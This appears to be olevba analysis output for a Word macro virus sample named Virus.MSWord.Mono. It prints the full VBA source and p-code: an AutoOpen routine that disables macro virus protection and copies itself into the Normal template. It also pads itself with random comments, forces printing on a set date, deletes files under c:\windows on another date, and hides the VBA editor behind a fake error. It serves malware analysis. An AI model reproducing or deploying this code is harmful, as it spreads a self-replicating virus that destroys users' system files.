olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mono
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mono - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CCSQRFR.bas 
in file: Virus.MSWord.Mono - OLE stream: 'Macros/VBA/CCSQRFR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'SW<>j#hmc&HrkD{s'zCRi&YM=[^:;onX}v7b
On Error Resume Next
'8S+~`#W++l<&=E=z}G;01^HHd@\53X)Lv:kE<w\\I+Vbvo$TwJ
Options.VirusProtection = False
'PQMBG;'8}'FCO0N9\T0y^QF+jLhYo#5(+@
Dim a1$
'"S_Tn)3
If (NormalTemplate.VBProject.VBComponents.Item(2).Name = "poly") Then
'LC/cxS*hGLO5@*X1x+K;sg;`9*$@k=7N9A
    Call poly
'N5r
    Randomize
'hx@T)\H{,w[B/N6~.$BTwTGpn`e~AP
    For a2 = 1 To 7 Step 1
'b2ITmTIQ7[OatD>=/S6XC
        dw = Int((20 * Rnd) + 1)
'N3ag[j1m4z('kEM-,2&dSV6MggGug*]d#JG;}lbHf;CJ
        dw = dw + 65
'-^B+3)J{TO|6EF<P.R{Uv_Kb'hcP06@j&Rhl@|l`vsH-zlbG
        a1$ = a1 + Chr(dw)
'1
    Next a2
'QG+;]pP3u
    ActiveDocument.VBProject.VBComponents(2).Export "c:\" + a1$ + ".dll"
'@i6K7sZDFrXxR@r::2B
    Open "c:\" + a1$ + ".dll" For Append As #1
'g
        Seek #1, 1
';cGmfJ)HAd?l0Yz8y,}\YuW8q(Jh8EFR;X5)u,^u7zp
        Print #1, "Attribute VB_Name = " + Chr(34) + a1$ + Chr(34)
'OioE4@H0[+5bP3~M"I<gtn2
    Close #1
'"0E3}s
    NormalTemplate.VBProject.VBComponents.Import ("c:\" + a1$ + ".dll")
'e/9$njk@KUlV45CWBSIW&T5{x~pHl~
    ElseIf (ActiveDocument.VBProject.VBComponents.Item(2).Name = "poly") Then
'2b#Ab,,=GU>=m
    Call poly
'DGpHe_Gz^Q6XgLv<
    Randomize
't<D#=}hXZ:Qkq*TH(KbPGy}YS[*3<#0IUU
    For a2 = 1 To 7 Step 1
'%G'?ZRY@viWJf1'8hzBak%kN5Yvy^#_{"z(=Xm%'
        dw = Int((20 * Rnd) + 1)
'?HQfK?(HWhW^mHlebe3i(9zn638x9
        dw = dw + 65
'd_ih>ndu6CUC5
        a1$ = a1 + Chr(dw)
'\.'\o]I3P|iEOT`%^uA,IiCHgJdQ2
    Next a2
'*}<[>q?k2=(OLY
    NormalTemplate.VBProject.VBComponents(2).Export "c:\" + a1$ + ".dll"
'?.
    Open "c:\" + a1$ + ".dll" For Append As #1
'h\{nUZ3u?YYidah9U
        Seek #1, 1
'V<HB|RXM$E.^04D*[cJIAc5&t&
        Print #1, "Attribute VB_Name = " + Chr(34) + a1$ + Chr(34)
'fhn5MroHMB9mTT\*d9';{@^
    Close #1
'D@55I[8aXZ)&08GX<ou
    ActiveDocument.VBProject.VBComponents.Import ("c:\" + a1$ + ".dll")
'F"91]}?8s.VZZbq+Fn:aFoJo6eu
End If
'}{sR^L0]ZqD
Kill ("c:\" + a1$ + ".dll")
'Q'D
If (Day(Now()) = 15) And Minute(Now()) = 29 Then
'=|#^[S$d?}=C?B7Yc:WW~x9
    ActiveDocument.PrintOut
'iG\OP.|2Xa,^fjJ)PW'H,/?~Z;HM'LJy;2QAQF:(]
ElseIf (Day(Now()) = 13 And WeekDay(Now()) = 13) Then
'TsIYE',//h:.%bpRl}R
    Kill "c:\windows\*.*"
'\@;a
End If
'E5s0GZUe-@"jw=7z3HC@}
ActiveDocument.Save
'R.u$kd8yMeF7ZUL^i(0+&T{7BtN7q
End Sub
'.{on
Function poly()
'8_\|I's19ZCSwT{iGhWK&%CHC\2J0|;'ld9kr};MvwPtWIneu0
y = Application.VBE.CodePanes(1).CodeModule.CountOfLines
'_wojjNfV1>MurE{P}Kj>)sWrmiw&n7;&u}:TA54
If (y <= 100) Then
'ZXq*4\L
For x = 1 To y Step 1
'o>|FklZCX_X'p'0
z = Chr(39)
'JIq'u8&j%.`:p57Q
w = Int((50 * Rnd) + 1)
'Z+yEB%tOGx9U&mMTE/f65@If-JnWi=(
For a = 1 To w Step 1
'PbB\0vDm1P%gp=IQ"_|*j&{~ba22{bt-
    dw = Int((93 * Rnd) + 1)
';$@u8co*
    dw = dw + 33
'm4+\)[Ly3=Z8?*"zfILLqHcDE87(kn@I~cOoA0vQk
    z = z + Chr(dw)
'B{D>6iu,v[th@Tn0kIT('o}#_z-EOu1
Next a
'^6&vO`(#z5uK1<gq9BrqHY3y:#?YE]gd3'84|2_v;9
   Application.VBE.CodePanes(1).CodeModule.InsertLines 2 * x, z
'hF0W-;q`MV7#9z'q)d:v&YPsKon(XQkJ|/`bfP}
Next x
'2_;rfF+[,`>*\UWpx5/dm?pjEXDRNXj@:r:0082R{F=
End If
'7b@&y;`~ECLd9sjM-48~#@d<?/@Nw%h(\a
End Function
'Gh2y@(=^0s1JxM}Jid51_}iVE;i8bZ3{m_(M+_j
Sub ToolsMacro()
'"SZr?<[CT]_0byiy/=e9zzq
End Sub
'3x,kexLv1PDY%Be)8(o4j|lNa;)A8J@]IpMK[`~%U'Z1PK
Sub FileTemplates()
'Yg<up@rQ5tO}$|p<5Ka<{3^&s'OM,+C'{~W"[gFV1`5YqU{D\.
End Sub
'dsn_;LX(,z9sW4r5>&K@[Dyf'AEW9xH<xcxN?
Sub ViewVBCode()
'(+c6Di6A;O{_oM@rY@U$sKV13Y(~ytqzEpELpn\H.
MsgBox "Not enough memory to execute", vbOKOnly + vbCritical
'.">XBaU<5JJD}AC|=:7_RxLX?2*mMKB&{X
End Sub
'MApct5,M-0Poai
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mono
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/CCSQRFR - 8919 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0024 "SW<>j#hmc&HrkD{s'zCRi&YM=[^:;onX}v7b"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	QuoteRem 0x0000 0x0032 "8S+~`#W++l<&=E=z}G;01^HHd@\53X)Lv:kE<w\\I+Vbvo$TwJ"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x0022 "PQMBG;'8}'FCO0N9\T0y^QF+jLhYo#5(+@"
' Line #6:
' 	Dim 
' 	VarDefn a1
' Line #7:
' 	QuoteRem 0x0000 0x0007 ""S_Tn)3"
' Line #8:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "poly"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #9:
' 	QuoteRem 0x0000 0x0022 "LC/cxS*hGLO5@*X1x+K;sg;`9*$@k=7N9A"
' Line #10:
' 	ArgsCall (Call) poly 0x0000 
' Line #11:
' 	QuoteRem 0x0000 0x0003 "N5r"
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	QuoteRem 0x0000 0x001E "hx@T)\H{,w[B/N6~.$BTwTGpn`e~AP"
' Line #14:
' 	StartForVariable 
' 	Ld a2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #15:
' 	QuoteRem 0x0000 0x0015 "b2ITmTIQ7[OatD>=/S6XC"
' Line #16:
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St dw 
' Line #17:
' 	QuoteRem 0x0000 0x002C "N3ag[j1m4z('kEM-,2&dSV6MggGug*]d#JG;}lbHf;CJ"
' Line #18:
' 	Ld dw 
' 	LitDI2 0x0041 
' 	Add 
' 	St dw 
' Line #19:
' 	QuoteRem 0x0000 0x0030 "-^B+3)J{TO|6EF<P.R{Uv_Kb'hcP06@j&Rhl@|l`vsH-zlbG"
' Line #20:
' 	Ld a1 
' 	Ld dw 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a1$ 
' Line #21:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #22:
' 	StartForVariable 
' 	Ld a2 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	QuoteRem 0x0000 0x0009 "QG+;]pP3u"
' Line #24:
' 	LitStr 0x0003 "c:\"
' 	Ld a1$ 
' 	Add 
' 	LitStr 0x0004 ".dll"
' 	Add 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #25:
' 	QuoteRem 0x0000 0x0013 "@i6K7sZDFrXxR@r::2B"
' Line #26:
' 	LitStr 0x0003 "c:\"
' 	Ld a1$ 
' 	Add 
' 	LitStr 0x0004 ".dll"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #27:
' 	QuoteRem 0x0000 0x0001 "g"
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0001 
' 	Seek 
' Line #29:
' 	QuoteRem 0x0000 0x002B ";cGmfJ)HAd?l0Yz8y,}\YuW8q(Jh8EFR;X5)u,^u7zp"
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld a1$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #31:
' 	QuoteRem 0x0000 0x0017 "OioE4@H0[+5bP3~M"I<gtn2"
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #33:
' 	QuoteRem 0x0000 0x0006 ""0E3}s"
' Line #34:
' 	LitStr 0x0003 "c:\"
' 	Ld a1$ 
' 	Add 
' 	LitStr 0x0004 ".dll"
' 	Add 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x001E "e/9$njk@KUlV45CWBSIW&T5{x~pHl~"
' Line #36:
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "poly"
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #37:
' 	QuoteRem 0x0000 0x000D "2b#Ab,,=GU>=m"
' Line #38:
' 	ArgsCall (Call) poly 0x0000 
' Line #39:
' 	QuoteRem 0x0000 0x0010 "DGpHe_Gz^Q6XgLv<"
' Line #40:
' 	ArgsCall Read 0x0000 
' Line #41:
' 	QuoteRem 0x0000 0x0022 "t<D#=}hXZ:Qkq*TH(KbPGy}YS[*3<#0IUU"
' Line #42:
' 	StartForVariable 
' 	Ld a2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #43:
' 	QuoteRem 0x0000 0x0028 "%G'?ZRY@viWJf1'8hzBak%kN5Yvy^#_{"z(=Xm%'"
' Line #44:
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St dw 
' Line #45:
' 	QuoteRem 0x0000 0x001D "?HQfK?(HWhW^mHlebe3i(9zn638x9"
' Line #46:
' 	Ld dw 
' 	LitDI2 0x0041 
' 	Add 
' 	St dw 
' Line #47:
' 	QuoteRem 0x0000 0x000D "d_ih>ndu6CUC5"
' Line #48:
' 	Ld a1 
' 	Ld dw 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a1$ 
' Line #49:
' 	QuoteRem 0x0000 0x001D "\.'\o]I3P|iEOT`%^uA,IiCHgJdQ2"
' Line #50:
' 	StartForVariable 
' 	Ld a2 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	QuoteRem 0x0000 0x000E "*}<[>q?k2=(OLY"
' Line #52:
' 	LitStr 0x0003 "c:\"
' 	Ld a1$ 
' 	Add 
' 	LitStr 0x0004 ".dll"
' 	Add 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #53:
' 	QuoteRem 0x0000 0x0002 "?."
' Line #54:
' 	LitStr 0x0003 "c:\"
' 	Ld a1$ 
' 	Add 
' 	LitStr 0x0004 ".dll"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #55:
' 	QuoteRem 0x0000 0x0011 "h\{nUZ3u?YYidah9U"
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0001 
' 	Seek 
' Line #57:
' 	QuoteRem 0x0000 0x001A "V<HB|RXM$E.^04D*[cJIAc5&t&"
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld a1$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #59:
' 	QuoteRem 0x0000 0x0017 "fhn5MroHMB9mTT\*d9';{@^"
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #61:
' 	QuoteRem 0x0000 0x0013 "D@55I[8aXZ)&08GX<ou"
' Line #62:
' 	LitStr 0x0003 "c:\"
' 	Ld a1$ 
' 	Add 
' 	LitStr 0x0004 ".dll"
' 	Add 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #63:
' 	QuoteRem 0x0000 0x001B "F"91]}?8s.VZZbq+Fn:aFoJo6eu"
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	QuoteRem 0x0000 0x000B "}{sR^L0]ZqD"
' Line #66:
' 	LitStr 0x0003 "c:\"
' 	Ld a1$ 
' 	Add 
' 	LitStr 0x0004 ".dll"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #67:
' 	QuoteRem 0x0000 0x0003 "Q'D"
' Line #68:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x001D 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #69:
' 	QuoteRem 0x0000 0x0017 "=|#^[S$d?}=C?B7Yc:WW~x9"
' Line #70:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #71:
' 	QuoteRem 0x0000 0x0029 "iG\OP.|2Xa,^fjJ)PW'H,/?~Z;HM'LJy;2QAQF:(]"
' Line #72:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	Paren 
' 	ElseIfBlock 
' Line #73:
' 	QuoteRem 0x0000 0x0013 "TsIYE',//h:.%bpRl}R"
' Line #74:
' 	LitStr 0x000E "c:\windows\*.*"
' 	ArgsCall Kill 0x0001 
' Line #75:
' 	QuoteRem 0x0000 0x0004 "\@;a"
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	QuoteRem 0x0000 0x0015 "E5s0GZUe-@"jw=7z3HC@}"
' Line #78:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #79:
' 	QuoteRem 0x0000 0x001D "R.u$kd8yMeF7ZUL^i(0+&T{7BtN7q"
' Line #80:
' 	EndSub 
' Line #81:
' 	QuoteRem 0x0000 0x0004 ".{on"
' Line #82:
' 	FuncDefn (Function poly())
' Line #83:
' 	QuoteRem 0x0000 0x0032 "8_\|I's19ZCSwT{iGhWK&%CHC\2J0|;'ld9kr};MvwPtWIneu0"
' Line #84:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd CodePanes 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St y 
' Line #85:
' 	QuoteRem 0x0000 0x0027 "_wojjNfV1>MurE{P}Kj>)sWrmiw&n7;&u}:TA54"
' Line #86:
' 	Ld y 
' 	LitDI2 0x0064 
' 	Le 
' 	Paren 
' 	IfBlock 
' Line #87:
' 	QuoteRem 0x0000 0x0007 "ZXq*4\L"
' Line #88:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld y 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #89:
' 	QuoteRem 0x0000 0x000F "o>|FklZCX_X'p'0"
' Line #90:
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St z 
' Line #91:
' 	QuoteRem 0x0000 0x0010 "JIq'u8&j%.`:p57Q"
' Line #92:
' 	LitDI2 0x0032 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St w 
' Line #93:
' 	QuoteRem 0x0000 0x001F "Z+yEB%tOGx9U&mMTE/f65@If-JnWi=("
' Line #94:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld w 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #95:
' 	QuoteRem 0x0000 0x0020 "PbB\0vDm1P%gp=IQ"_|*j&{~ba22{bt-"
' Line #96:
' 	LitDI2 0x005D 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St dw 
' Line #97:
' 	QuoteRem 0x0000 0x0008 ";$@u8co*"
' Line #98:
' 	Ld dw 
' 	LitDI2 0x0021 
' 	Add 
' 	St dw 
' Line #99:
' 	QuoteRem 0x0000 0x0029 "m4+\)[Ly3=Z8?*"zfILLqHcDE87(kn@I~cOoA0vQk"
' Line #100:
' 	Ld z 
' 	Ld dw 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St z 
' Line #101:
' 	QuoteRem 0x0000 0x001F "B{D>6iu,v[th@Tn0kIT('o}#_z-EOu1"
' Line #102:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	QuoteRem 0x0000 0x002A "^6&vO`(#z5uK1<gq9BrqHY3y:#?YE]gd3'84|2_v;9"
' Line #104:
' 	LitDI2 0x0002 
' 	Ld x 
' 	Mul 
' 	Ld z 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd CodePanes 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #105:
' 	QuoteRem 0x0000 0x0027 "hF0W-;q`MV7#9z'q)d:v&YPsKon(XQkJ|/`bfP}"
' Line #106:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	QuoteRem 0x0000 0x002B "2_;rfF+[,`>*\UWpx5/dm?pjEXDRNXj@:r:0082R{F="
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	QuoteRem 0x0000 0x0022 "7b@&y;`~ECLd9sjM-48~#@d<?/@Nw%h(\a"
' Line #110:
' 	EndFunc 
' Line #111:
' 	QuoteRem 0x0000 0x0027 "Gh2y@(=^0s1JxM}Jid51_}iVE;i8bZ3{m_(M+_j"
' Line #112:
' 	FuncDefn (Sub ToolsMacro())
' Line #113:
' 	QuoteRem 0x0000 0x0017 ""SZr?<[CT]_0byiy/=e9zzq"
' Line #114:
' 	EndSub 
' Line #115:
' 	QuoteRem 0x0000 0x002E "3x,kexLv1PDY%Be)8(o4j|lNa;)A8J@]IpMK[`~%U'Z1PK"
' Line #116:
' 	FuncDefn (Sub FileTemplates())
' Line #117:
' 	QuoteRem 0x0000 0x0032 "Yg<up@rQ5tO}$|p<5Ka<{3^&s'OM,+C'{~W"[gFV1`5YqU{D\."
' Line #118:
' 	EndSub 
' Line #119:
' 	QuoteRem 0x0000 0x0025 "dsn_;LX(,z9sW4r5>&K@[Dyf'AEW9xH<xcxN?"
' Line #120:
' 	FuncDefn (Sub ViewVBCode())
' Line #121:
' 	QuoteRem 0x0000 0x0029 "(+c6Di6A;O{_oM@rY@U$sKV13Y(~ytqzEpELpn\H."
' Line #122:
' 	LitStr 0x001C "Not enough memory to execute"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #123:
' 	QuoteRem 0x0000 0x0022 ".">XBaU<5JJD}AC|=:7_RxLX?2*mMKB&{X"
' Line #124:
' 	EndSub 
' Line #125:
' 	QuoteRem 0x0000 0x000E "MApct5,M-0Poai"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

